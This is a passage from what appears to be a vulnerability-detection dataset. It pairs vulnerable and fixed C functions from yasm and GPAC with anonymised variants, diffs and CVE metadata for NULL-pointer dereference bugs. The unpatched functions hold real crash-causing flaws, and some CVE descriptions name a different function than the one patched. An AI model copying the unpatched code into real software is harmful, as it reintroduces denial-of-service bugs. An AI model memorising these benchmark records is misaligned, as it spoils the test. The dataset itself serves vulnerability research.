                yasm_expr *equ_expr = yasm_expr_copy(equ_expr_c);
                equ_intn = yasm_expr_get_intnum(&equ_expr, 1);

                if (equ_intn == NULL) {
                    yasm_error_set(YASM_ERROR_VALUE,
                                   N_(""EQU value not an integer expression""));
                    yasm_errwarn_propagate(errwarns, equ_expr->line);
                } else
                    value_intn = yasm_intnum_copy(equ_intn);
                entry->index = SHN_ABS;
                yasm_expr_destroy(equ_expr);
            }
        }
        if (value_intn == NULL)
            value_intn = yasm_intnum_create_uint(entry->value);

        /* If symbol is in a TLS section, force its type to TLS. */
        if (entry->sym) {
            yasm_bytecode *precbc;
            yasm_section *sect;
            elf_secthead *shead;
            if (yasm_symrec_get_label(entry->sym, &precbc) &&
                (sect = yasm_bc_get_section(precbc)) &&
                (shead = yasm_section_get_data(sect, &elf_section_data)) &&
                shead->flags & SHF_TLS) {
                entry->type = STT_TLS;
            }
        }

        if (!elf_march->write_symtab_entry || !elf_march->symtab_entry_size)
            yasm_internal_error(N_(""Unsupported machine for ELF output""));
        elf_march->write_symtab_entry(bufp, entry, value_intn, size_intn);
        fwrite(buf, elf_march->symtab_entry_size, 1, f);
        size += elf_march->symtab_entry_size;

        yasm_intnum_destroy(size_intn);
        yasm_intnum_destroy(value_intn);
    }
    return size;
}","unsigned long
elf_symtab_write_to_file(FILE *VAR_0, elf_symtab_head *VAR_1,
                         yasm_errwarns *VAR_2)
{
    unsigned char VAR_3[VAR_4], *VAR_5;
    elf_symtab_entry *VAR_6;
    unsigned long VAR_7 = 0;

    if (!VAR_1)
        yasm_internal_error(N_(""symtab is null""));

    STAILQ_FOREACH(VAR_6, VAR_1, VAR_8) {

        yasm_intnum *VAR_9=NULL, *VAR_10=NULL;
        VAR_5 = VAR_3;

        /* COMMENT_0 */
        if (VAR_6->xsize) {
            yasm_intnum *VAR_11 = yasm_expr_get_intnum(&VAR_6->xsize, 1);
            if (!VAR_11) {
                yasm_error_set(VAR_12,
                               N_(""size specifier not an integer expression""));
                yasm_errwarn_propagate(VAR_2, VAR_6->xsize->line);
            } else
                VAR_9 = yasm_intnum_copy(VAR_11);
        }
        if (!VAR_9)
            VAR_9 = yasm_intnum_create_uint(VAR_6->size);

        /* COMMENT_1 */
        if (VAR_6->sym) {
            const yasm_expr *VAR_13;
            VAR_13 = yasm_symrec_get_equ(VAR_6->sym);

            if (VAR_13 != NULL) {
                const yasm_intnum *VAR_14;
                yasm_expr *VAR_15 = yasm_expr_copy(VAR_13);
                VAR_14 = yasm_expr_get_intnum(&VAR_15, 1);

                if (VAR_14 == NULL) {
                    yasm_error_set(VAR_12,
                                   N_(""EQU value not an integer expression""));
                    yasm_errwarn_propagate(VAR_2, VAR_15->line);
                } else
                    VAR_10 = yasm_intnum_copy(VAR_14);
                VAR_6->index = VAR_16;
                yasm_expr_destroy(VAR_15);
            }
        }
        if (VAR_10 == NULL)
            VAR_10 = yasm_intnum_create_uint(VAR_6->value);

        /* COMMENT_2 */
        if (VAR_6->sym) {
            yasm_bytecode *VAR_17;
            yasm_section *VAR_18;
            elf_secthead *VAR_19;
            if (yasm_symrec_get_label(VAR_6->sym, &VAR_17) &&
                (VAR_18 = yasm_bc_get_section(VAR_17)) &&
                (VAR_19 = yasm_section_get_data(VAR_18, &VAR_20)) &&
                VAR_19->flags & VAR_21) {
                VAR_6->type = VAR_22;
            }
        }

        if (!VAR_23->write_symtab_entry || !VAR_23->symtab_entry_size)
            yasm_internal_error(N_(""Unsupported machine for ELF output""));
        VAR_23->write_symtab_entry(VAR_5, VAR_6, VAR_10, VAR_9);
        fwrite(VAR_3, VAR_23->symtab_entry_size, 1, VAR_0);
        VAR_7 += VAR_23->symtab_entry_size;

        yasm_intnum_destroy(VAR_9);
        yasm_intnum_destroy(VAR_10);
    }
    return VAR_7;
}",yasm/8a9af472a7160edf3d8ee0a994433d3c6e14cefc/elf.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -16,15 +16,15 @@
 
         /* get size (if specified); expr overrides stored integer */
         if (entry->xsize) {
-            size_intn = yasm_intnum_copy(
-                yasm_expr_get_intnum(&entry->xsize, 1));
-            if (!size_intn) {
+            yasm_intnum *intn = yasm_expr_get_intnum(&entry->xsize, 1);
+            if (!intn) {
                 yasm_error_set(YASM_ERROR_VALUE,
                                N_(""size specifier not an integer expression""));
                 yasm_errwarn_propagate(errwarns, entry->xsize->line);
-            }
+            } else
+                size_intn = yasm_intnum_copy(intn);
         }
-        else
+        if (!size_intn)
             size_intn = yasm_intnum_create_uint(entry->size);
 
         /* get EQU value for constants */","{'deleted_lines': ['            size_intn = yasm_intnum_copy(', '                yasm_expr_get_intnum(&entry->xsize, 1));', '            if (!size_intn) {', '            }', '        else'], 'added_lines': ['            yasm_intnum *intn = yasm_expr_get_intnum(&entry->xsize, 1);', '            if (!intn) {', '            } else', '                size_intn = yasm_intnum_copy(intn);', '        if (!size_intn)']}",True,"Yasm v1.3.0.78 was found prone to NULL Pointer Dereference in /libyasm/intnum.c and /elf/elf.c, which allows the attacker to cause a denial of service via a crafted file.",5.5,MEDIUM,1,valid,2023-06-30T05:21:06Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_read.c,gf_isom_get_user_data,"GF_EXPORT
GF_Err gf_isom_get_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u32 UserDataIndex, u8 **userData, u32 *userDataSize)
{
GF_UserDataMap *map;
GF_UnknownBox *ptr;
GF_BitStream *bs;
u32 i;
bin128 t;
GF_TrackBox *trak;
GF_UserDataBox *udta;
if (!movie || !movie->moov) return GF_BAD_PARAM;
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return GF_BAD_PARAM;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (!udta) return GF_BAD_PARAM;
if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
memset(t, 1, 16);
if (!userData || !userDataSize || *userData) return GF_BAD_PARAM;
i=0;
while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
if ((map->boxType == GF_ISOM_BOX_TYPE_UUID) && !memcmp(map->uuid, UUID, 16)) goto found;
else if (map->boxType == UserDataType) goto found;
}
return GF_BAD_PARAM;
found:
if (UserDataIndex) {
if (UserDataIndex > gf_list_count(map->boxes) ) return GF_BAD_PARAM;
ptr = (GF_UnknownBox*)gf_list_get(map->boxes, UserDataIndex-1);
if (ptr->type == GF_ISOM_BOX_TYPE_UNKNOWN) {
if (!ptr->dataSize) {
*userData = NULL;
*userDataSize = 0;
return GF_OK;
}
*userData = (char *)gf_malloc(sizeof(char)*ptr->dataSize);
if (!*userData) return GF_OUT_OF_MEM;
memcpy(*userData, ptr->data, sizeof(char)*ptr->dataSize);
*userDataSize = ptr->dataSize;
return GF_OK;
} else if (ptr->type == GF_ISOM_BOX_TYPE_UUID) {
GF_UnknownUUIDBox *p_uuid = (GF_UnknownUUIDBox *)ptr;
if (!p_uuid->dataSize) {
*userData = NULL;
*userDataSize = 0;
return GF_OK;
}
*userData = (char *)gf_malloc(sizeof(char)*p_uuid->dataSize);
if (!*userData) return GF_OUT_OF_MEM;
memcpy(*userData, p_uuid->data, sizeof(char)*p_uuid->dataSize);
*userDataSize = p_uuid->dataSize;
return GF_OK;
} else {
char *str = NULL;
switch (ptr->type) {
case GF_ISOM_BOX_TYPE_NAME:
str = ((GF_NameBox *)ptr)->string;
break;
case GF_ISOM_BOX_TYPE_KIND:
str = ((GF_KindBox *)ptr)->value;
break;
}
if (str) {
u32 len = (u32) strlen(str) + 1;
*userData = (char *)gf_malloc(sizeof(char) * len);
if (!*userData) return GF_OUT_OF_MEM;
memcpy(*userData, str, sizeof(char)*len);
*userDataSize = len;
return GF_OK;
}
return GF_NOT_SUPPORTED;
}
}
bs = gf_bs_new(NULL, 0, GF_BITSTREAM_WRITE);
i=0;
while ( (ptr = (GF_UnknownBox*)gf_list_enum(map->boxes, &i))) {
u32 type, s, data_size;
char *data=NULL;
if (ptr->type == GF_ISOM_BOX_TYPE_UNKNOWN) {
type = ptr->original_4cc;
data_size = ptr->dataSize;
data = ptr->data;
} else if (ptr->type == GF_ISOM_BOX_TYPE_UUID) {
GF_UnknownUUIDBox *p_uuid = (GF_UnknownUUIDBox *)ptr;
type = p_uuid->type;
data_size = p_uuid->dataSize;
data = p_uuid->data;
} else {
#ifndef GPAC_DISABLE_ISOM_WRITE
gf_isom_box_write((GF_Box *)ptr, bs);
#else
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
continue;
}
s = data_size+8;
if (ptr->type==GF_ISOM_BOX_TYPE_UUID) s += 16;
gf_bs_write_u32(bs, s);
gf_bs_write_u32(bs, type);
if (type==GF_ISOM_BOX_TYPE_UUID) gf_bs_write_data(bs, (char *) map->uuid, 16);
if (data) {
gf_bs_write_data(bs, data, data_size);
} else if (ptr->child_boxes) {
#ifndef GPAC_DISABLE_ISOM_WRITE
gf_isom_box_array_write((GF_Box *)ptr, ptr->child_boxes, bs);
#else
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
}
}
gf_bs_get_content(bs, userData, userDataSize);
gf_bs_del(bs);
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u32 VAR_5, u8 **VAR_6, u32 *VAR_7)
{
GF_UserDataMap *VAR_8;
GF_UnknownBox *VAR_9;
GF_BitStream *VAR_10;
u32 VAR_11;
bin128 VAR_12;
GF_TrackBox *VAR_13;
GF_UserDataBox *VAR_14;
if (!VAR_1 || !VAR_1->moov) return VAR_15;
if (VAR_2) {
VAR_13 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_13) return VAR_15;
VAR_14 = VAR_13->udta;
} else {
VAR_14 = VAR_1->moov->udta;
}
if (!VAR_14) return VAR_15;
if (VAR_3 == VAR_16) VAR_3 = 0;
memset(VAR_12, 1, 16);
if (!VAR_6 || !VAR_7 || *VAR_6) return VAR_15;
VAR_11=0;
while ((VAR_8 = (GF_UserDataMap*)gf_list_enum(VAR_14->recordList, &VAR_11))) {
if ((VAR_8->boxType == VAR_16) && !memcmp(VAR_8->uuid, VAR_4, 16)) goto found;
else if (VAR_8->boxType == VAR_3) goto found;
}
return VAR_15;
found:
if (VAR_5) {
if (VAR_5 > gf_list_count(VAR_8->boxes) ) return VAR_15;
VAR_9 = (GF_UnknownBox*)gf_list_get(VAR_8->boxes, VAR_5-1);
if (VAR_9->type == VAR_17) {
if (!VAR_9->dataSize) {
*VAR_6 = NULL;
*VAR_7 = 0;
return VAR_18;
}
*VAR_6 = (char *)gf_malloc(sizeof(char)*VAR_9->dataSize);
if (!*VAR_6) return VAR_19;
memcpy(*VAR_6, VAR_9->data, sizeof(char)*VAR_9->dataSize);
*VAR_7 = VAR_9->dataSize;
return VAR_18;
} else if (VAR_9->type == VAR_16) {
GF_UnknownUUIDBox *VAR_20 = (GF_UnknownUUIDBox *)VAR_9;
if (!VAR_20->dataSize) {
*VAR_6 = NULL;
*VAR_7 = 0;
return VAR_18;
}
*VAR_6 = (char *)gf_malloc(sizeof(char)*VAR_20->dataSize);
if (!*VAR_6) return VAR_19;
memcpy(*VAR_6, VAR_20->data, sizeof(char)*VAR_20->dataSize);
*VAR_7 = VAR_20->dataSize;
return VAR_18;
} else {
char *VAR_21 = NULL;
switch (VAR_9->type) {
case VAR_22:
VAR_21 = ((GF_NameBox *)VAR_9)->string;
break;
case VAR_23:
VAR_21 = ((GF_KindBox *)VAR_9)->value;
break;
}
if (VAR_21) {
u32 VAR_24 = (u32) strlen(VAR_21) + 1;
*VAR_6 = (char *)gf_malloc(sizeof(char) * VAR_24);
if (!*VAR_6) return VAR_19;
memcpy(*VAR_6, VAR_21, sizeof(char)*VAR_24);
*VAR_7 = VAR_24;
return VAR_18;
}
return VAR_25;
}
}
VAR_10 = gf_bs_new(NULL, 0, VAR_26);
VAR_11=0;
while ( (VAR_9 = (GF_UnknownBox*)gf_list_enum(VAR_8->boxes, &VAR_11))) {
u32 VAR_27, VAR_28, VAR_29;
char *VAR_30=NULL;
if (VAR_9->type == VAR_17) {
VAR_27 = VAR_9->original_4cc;
VAR_29 = VAR_9->dataSize;
VAR_30 = VAR_9->data;
} else if (VAR_9->type == VAR_16) {
GF_UnknownUUIDBox *VAR_20 = (GF_UnknownUUIDBox *)VAR_9;
VAR_27 = VAR_20->type;
VAR_29 = VAR_20->dataSize;
VAR_30 = VAR_20->data;
} else {
#ifndef VAR_31
gf_isom_box_write((GF_Box *)VAR_9, VAR_10);
#else
GF_LOG(VAR_32, VAR_33, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
continue;
}
VAR_28 = VAR_29+8;
if (VAR_9->type==VAR_16) VAR_28 += 16;
gf_bs_write_u32(VAR_10, VAR_28);
gf_bs_write_u32(VAR_10, VAR_27);
if (VAR_27==VAR_16) gf_bs_write_data(VAR_10, (char *) VAR_8->uuid, 16);
if (VAR_30) {
gf_bs_write_data(VAR_10, VAR_30, VAR_29);
} else if (VAR_9->child_boxes) {
#ifndef VAR_31
gf_isom_box_array_write((GF_Box *)VAR_9, VAR_9->child_boxes, VAR_10);
#else
GF_LOG(VAR_32, VAR_33, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
}
}
gf_bs_get_content(VAR_10, VAR_6, VAR_7);
gf_bs_del(VAR_10);
return VAR_18;
}",,"GF_EXPORT
GF_Err gf_isom_get_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u32 UserDataIndex, u8 **userData, u32 *userDataSize)
{
	GF_UserDataMap *map;
	GF_UnknownBox *ptr;
	GF_BitStream *bs;
	u32 i;
	bin128 t;
	GF_TrackBox *trak;
	GF_UserDataBox *udta;

	if (!movie || !movie->moov) return GF_BAD_PARAM;

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return GF_BAD_PARAM;
		udta = trak->udta;
	} else {
		if (!movie->moov) return GF_BAD_PARAM;
		udta = movie->moov->udta;
	}
	if (!udta) return GF_BAD_PARAM;

	if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
	memset(t, 1, 16);

	if (!userData || !userDataSize || *userData) return GF_BAD_PARAM;

	i=0;
	while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
		if ((map->boxType == GF_ISOM_BOX_TYPE_UUID) && !memcmp(map->uuid, UUID, 16)) goto found;
		else if (map->boxType == UserDataType) goto found;

	}
	return GF_BAD_PARAM;

found:
	if (UserDataIndex) {
		if (UserDataIndex > gf_list_count(map->boxes) ) return GF_BAD_PARAM;
		ptr = (GF_UnknownBox*)gf_list_get(map->boxes, UserDataIndex-1);

		if (ptr->type == GF_ISOM_BOX_TYPE_UNKNOWN) {
			if (!ptr->dataSize) {
				*userData = NULL;
				*userDataSize = 0;
				return GF_OK;
			}
			*userData = (char *)gf_malloc(sizeof(char)*ptr->dataSize);
			if (!*userData) return GF_OUT_OF_MEM;
			memcpy(*userData, ptr->data, sizeof(char)*ptr->dataSize);
			*userDataSize = ptr->dataSize;
			return GF_OK;
		} else if (ptr->type == GF_ISOM_BOX_TYPE_UUID) {
			GF_UnknownUUIDBox *p_uuid = (GF_UnknownUUIDBox *)ptr;
			if (!p_uuid->dataSize) {
				*userData = NULL;
				*userDataSize = 0;
				return GF_OK;
			}
			*userData = (char *)gf_malloc(sizeof(char)*p_uuid->dataSize);
			if (!*userData) return GF_OUT_OF_MEM;
			memcpy(*userData, p_uuid->data, sizeof(char)*p_uuid->dataSize);
			*userDataSize = p_uuid->dataSize;
			return GF_OK;
		} else {
			char *str = NULL;
			switch (ptr->type) {
			case GF_ISOM_BOX_TYPE_NAME:
			//case GF_QT_BOX_TYPE_NAME: same as above
				str = ((GF_NameBox *)ptr)->string;
				break;
			case GF_ISOM_BOX_TYPE_KIND:
				str = ((GF_KindBox *)ptr)->value;
				break;
			}
			if (str) {
				u32 len = (u32) strlen(str) + 1;
				*userData = (char *)gf_malloc(sizeof(char) * len);
				if (!*userData) return GF_OUT_OF_MEM;
				memcpy(*userData, str, sizeof(char)*len);
				*userDataSize = len;
				return GF_OK;
			}
			return GF_NOT_SUPPORTED;
		}
	}

	//serialize all boxes
	bs = gf_bs_new(NULL, 0, GF_BITSTREAM_WRITE);
	i=0;
	while ( (ptr = (GF_UnknownBox*)gf_list_enum(map->boxes, &i))) {
		u32 type, s, data_size;
		char *data=NULL;
		if (ptr->type == GF_ISOM_BOX_TYPE_UNKNOWN) {
			type = ptr->original_4cc;
			data_size = ptr->dataSize;
			data = ptr->data;
		} else if (ptr->type == GF_ISOM_BOX_TYPE_UUID) {
			GF_UnknownUUIDBox *p_uuid = (GF_UnknownUUIDBox *)ptr;
			type = p_uuid->type;
			data_size = p_uuid->dataSize;
			data = p_uuid->data;
		} else {
#ifndef GPAC_DISABLE_ISOM_WRITE
			gf_isom_box_write((GF_Box *)ptr, bs);
#else
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
			continue;
		}
		s = data_size+8;
		if (ptr->type==GF_ISOM_BOX_TYPE_UUID) s += 16;

		gf_bs_write_u32(bs, s);
		gf_bs_write_u32(bs, type);
		if (type==GF_ISOM_BOX_TYPE_UUID) gf_bs_write_data(bs, (char *) map->uuid, 16);
		if (data) {
			gf_bs_write_data(bs, data, data_size);
		} else if (ptr->child_boxes) {
#ifndef GPAC_DISABLE_ISOM_WRITE
			gf_isom_box_array_write((GF_Box *)ptr, ptr->child_boxes, bs);
#else
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
		}
	}
	gf_bs_get_content(bs, userData, userDataSize);
	gf_bs_del(bs);
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u32 VAR_5, u8 **VAR_6, u32 *VAR_7)
{
	GF_UserDataMap *VAR_8;
	GF_UnknownBox *VAR_9;
	GF_BitStream *VAR_10;
	u32 VAR_11;
	bin128 VAR_12;
	GF_TrackBox *VAR_13;
	GF_UserDataBox *VAR_14;

	if (!VAR_1 || !VAR_1->moov) return VAR_15;

	if (VAR_2) {
		VAR_13 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_13) return VAR_15;
		VAR_14 = VAR_13->udta;
	} else {
		if (!VAR_1->moov) return VAR_15;
		VAR_14 = VAR_1->moov->udta;
	}
	if (!VAR_14) return VAR_15;

	if (VAR_3 == VAR_16) VAR_3 = 0;
	memset(VAR_12, 1, 16);

	if (!VAR_6 || !VAR_7 || *VAR_6) return VAR_15;

	VAR_11=0;
	while ((VAR_8 = (GF_UserDataMap*)gf_list_enum(VAR_14->recordList, &VAR_11))) {
		if ((VAR_8->boxType == VAR_16) && !memcmp(VAR_8->uuid, VAR_4, 16)) goto found;
		else if (VAR_8->boxType == VAR_3) goto found;

	}
	return VAR_15;

found:
	if (VAR_5) {
		if (VAR_5 > gf_list_count(VAR_8->boxes) ) return VAR_15;
		VAR_9 = (GF_UnknownBox*)gf_list_get(VAR_8->boxes, VAR_5-1);

		if (VAR_9->type == VAR_17) {
			if (!VAR_9->dataSize) {
				*VAR_6 = NULL;
				*VAR_7 = 0;
				return VAR_18;
			}
			*VAR_6 = (char *)gf_malloc(sizeof(char)*VAR_9->dataSize);
			if (!*VAR_6) return VAR_19;
			memcpy(*VAR_6, VAR_9->data, sizeof(char)*VAR_9->dataSize);
			*VAR_7 = VAR_9->dataSize;
			return VAR_18;
		} else if (VAR_9->type == VAR_16) {
			GF_UnknownUUIDBox *VAR_20 = (GF_UnknownUUIDBox *)VAR_9;
			if (!VAR_20->dataSize) {
				*VAR_6 = NULL;
				*VAR_7 = 0;
				return VAR_18;
			}
			*VAR_6 = (char *)gf_malloc(sizeof(char)*VAR_20->dataSize);
			if (!*VAR_6) return VAR_19;
			memcpy(*VAR_6, VAR_20->data, sizeof(char)*VAR_20->dataSize);
			*VAR_7 = VAR_20->dataSize;
			return VAR_18;
		} else {
			char *VAR_21 = NULL;
			switch (VAR_9->type) {
			case VAR_22:
			/* COMMENT_0 */
				VAR_21 = ((GF_NameBox *)VAR_9)->string;
				break;
			case VAR_23:
				VAR_21 = ((GF_KindBox *)VAR_9)->value;
				break;
			}
			if (VAR_21) {
				u32 VAR_24 = (u32) strlen(VAR_21) + 1;
				*VAR_6 = (char *)gf_malloc(sizeof(char) * VAR_24);
				if (!*VAR_6) return VAR_19;
				memcpy(*VAR_6, VAR_21, sizeof(char)*VAR_24);
				*VAR_7 = VAR_24;
				return VAR_18;
			}
			return VAR_25;
		}
	}

	/* COMMENT_1 */
	VAR_10 = gf_bs_new(NULL, 0, VAR_26);
	VAR_11=0;
	while ( (VAR_9 = (GF_UnknownBox*)gf_list_enum(VAR_8->boxes, &VAR_11))) {
		u32 VAR_27, VAR_28, VAR_29;
		char *VAR_30=NULL;
		if (VAR_9->type == VAR_17) {
			VAR_27 = VAR_9->original_4cc;
			VAR_29 = VAR_9->dataSize;
			VAR_30 = VAR_9->data;
		} else if (VAR_9->type == VAR_16) {
			GF_UnknownUUIDBox *VAR_20 = (GF_UnknownUUIDBox *)VAR_9;
			VAR_27 = VAR_20->type;
			VAR_29 = VAR_20->dataSize;
			VAR_30 = VAR_20->data;
		} else {
#ifndef VAR_31
			gf_isom_box_write((GF_Box *)VAR_9, VAR_10);
#else
			GF_LOG(VAR_32, VAR_33, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
			continue;
		}
		VAR_28 = VAR_29+8;
		if (VAR_9->type==VAR_16) VAR_28 += 16;

		gf_bs_write_u32(VAR_10, VAR_28);
		gf_bs_write_u32(VAR_10, VAR_27);
		if (VAR_27==VAR_16) gf_bs_write_data(VAR_10, (char *) VAR_8->uuid, 16);
		if (VAR_30) {
			gf_bs_write_data(VAR_10, VAR_30, VAR_29);
		} else if (VAR_9->child_boxes) {
#ifndef VAR_31
			gf_isom_box_array_write((GF_Box *)VAR_9, VAR_9->child_boxes, VAR_10);
#else
			GF_LOG(VAR_32, VAR_33, (""ISOBMF: udta is a box-list - cannot export in read-only version of libisom in GPAC\n"" ));
#endif
		}
	}
	gf_bs_get_content(VAR_10, VAR_6, VAR_7);
	gf_bs_del(VAR_10);
	return VAR_18;
}",,"--- func_before
+++ func_after
@@ -16,6 +16,7 @@
 		if (!trak) return GF_BAD_PARAM;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return GF_BAD_PARAM;
 		udta = movie->moov->udta;
 	}
 	if (!udta) return GF_BAD_PARAM;","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return GF_BAD_PARAM;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_read.c,gf_isom_get_user_data_count,"GF_EXPORT
u32 gf_isom_get_user_data_count(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID)
{
GF_UserDataMap *map;
GF_TrackBox *trak;
GF_UserDataBox *udta;
bin128 t;
u32 i, count;
if (!movie || !movie->moov) return 0;
if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
memset(t, 1, 16);
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return 0;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (!udta) return 0;
i=0;
while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
count = gf_list_count(map->boxes);
if ((map->boxType == GF_ISOM_BOX_TYPE_UUID) && !memcmp(map->uuid, UUID, 16)) return count;
else if (map->boxType == UserDataType) return count;
}
return 0;
}","GF_EXPORT
VAR_0 gf_isom_get_user_data_count(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4)
{
GF_UserDataMap *VAR_5;
GF_TrackBox *VAR_6;
GF_UserDataBox *VAR_7;
bin128 VAR_8;
u32 VAR_9, VAR_10;
if (!VAR_1 || !VAR_1->moov) return 0;
if (VAR_3 == VAR_11) VAR_3 = 0;
memset(VAR_8, 1, 16);
if (VAR_2) {
VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_6) return 0;
VAR_7 = VAR_6->udta;
} else {
VAR_7 = VAR_1->moov->udta;
}
if (!VAR_7) return 0;
VAR_9=0;
while ((VAR_5 = (GF_UserDataMap*)gf_list_enum(VAR_7->recordList, &VAR_9))) {
VAR_10 = gf_list_count(VAR_5->boxes);
if ((VAR_5->boxType == VAR_11) && !memcmp(VAR_5->uuid, VAR_4, 16)) return VAR_10;
else if (VAR_5->boxType == VAR_3) return VAR_10;
}
return 0;
}",,"GF_EXPORT
u32 gf_isom_get_user_data_count(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID)
{
	GF_UserDataMap *map;
	GF_TrackBox *trak;
	GF_UserDataBox *udta;
	bin128 t;
	u32 i, count;

	if (!movie || !movie->moov) return 0;

	if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
	memset(t, 1, 16);

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return 0;
		udta = trak->udta;
	} else {
		if (!movie->moov) return 0;
		udta = movie->moov->udta;
	}
	if (!udta) return 0;

	i=0;
	while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
		count = gf_list_count(map->boxes);

		if ((map->boxType == GF_ISOM_BOX_TYPE_UUID) && !memcmp(map->uuid, UUID, 16)) return count;
		else if (map->boxType == UserDataType) return count;
	}
	return 0;
}","GF_EXPORT
VAR_0 gf_isom_get_user_data_count(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4)
{
	GF_UserDataMap *VAR_5;
	GF_TrackBox *VAR_6;
	GF_UserDataBox *VAR_7;
	bin128 VAR_8;
	u32 VAR_9, VAR_10;

	if (!VAR_1 || !VAR_1->moov) return 0;

	if (VAR_3 == VAR_11) VAR_3 = 0;
	memset(VAR_8, 1, 16);

	if (VAR_2) {
		VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_6) return 0;
		VAR_7 = VAR_6->udta;
	} else {
		if (!VAR_1->moov) return 0;
		VAR_7 = VAR_1->moov->udta;
	}
	if (!VAR_7) return 0;

	VAR_9=0;
	while ((VAR_5 = (GF_UserDataMap*)gf_list_enum(VAR_7->recordList, &VAR_9))) {
		VAR_10 = gf_list_count(VAR_5->boxes);

		if ((VAR_5->boxType == VAR_11) && !memcmp(VAR_5->uuid, VAR_4, 16)) return VAR_10;
		else if (VAR_5->boxType == VAR_3) return VAR_10;
	}
	return 0;
}",,"--- func_before
+++ func_after
@@ -17,6 +17,7 @@
 		if (!trak) return 0;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return 0;
 		udta = movie->moov->udta;
 	}
 	if (!udta) return 0;","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return 0;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_read.c,gf_isom_get_udta_type,"GF_EXPORT
GF_Err gf_isom_get_udta_type(GF_ISOFile *movie, u32 trackNumber, u32 udta_idx, u32 *UserDataType, bin128 *UUID)
{
GF_TrackBox *trak;
GF_UserDataBox *udta;
GF_UserDataMap *map;
if (!movie || !movie->moov || !udta_idx) return GF_BAD_PARAM;
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return GF_OK;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (!udta) return GF_BAD_PARAM;
if (udta_idx>gf_list_count(udta->recordList)) return GF_BAD_PARAM;
map = (GF_UserDataMap*)gf_list_get(udta->recordList, udta_idx - 1);
if (UserDataType) *UserDataType = map->boxType;
if (UUID) memcpy(*UUID, map->uuid, 16);
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_udta_type(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 *VAR_4, bin128 *VAR_5)
{
GF_TrackBox *VAR_6;
